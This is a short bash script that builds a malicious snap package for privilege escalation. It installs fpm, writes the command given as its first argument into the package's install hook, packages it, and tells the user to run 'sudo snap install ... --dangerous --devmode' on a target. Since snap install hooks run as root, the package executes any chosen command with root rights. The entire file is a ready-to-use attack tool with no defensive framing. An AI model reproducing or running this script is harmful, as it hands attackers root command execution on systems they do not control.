#!/bin/bash
echo -e "\e[32mInstalling fpm...\e[0m"
sudo apt-get update
apt-get install ruby ruby-dev rubygems build-essential
gem install --no-document fpm
echo -e "\e[32mGenerating the payload...\e[0m"
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$1" > meta/hooks/install
chmod +x meta/hooks/install
fpm -n payload -s dir -t snap -a all meta
echo -e "Payload generated, use: \e[32msudo snap install payload_1.0_all.snap --dangerous --devmode\e[0m (on target)"
